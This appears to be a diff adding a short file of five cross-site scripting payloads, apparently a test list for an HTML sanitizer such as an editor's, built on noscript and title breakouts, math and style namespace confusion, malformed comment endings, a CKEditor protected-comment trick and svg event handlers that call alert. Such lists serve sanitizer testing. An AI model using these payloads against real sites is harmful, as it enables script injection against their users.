@@ -1,0 +1,5 @@
+a<u title='<noscript>"><img src onerror=alert(1)></noscript>'>b
+<math><xss style=display:block>t<style>X<a title="</style><img src onerror=alert(1)>">.<a>.
+<!-- --!> <img src onerror=alert(1)> -->
+<!--{cke_protected} --!> <img src onerror=alert(1)>-->
+<!- - ><img title="--><svg%0Aonmouseover=alert(document.domain)>"onmouseover=alert(1)>+bad=true"<!- - >
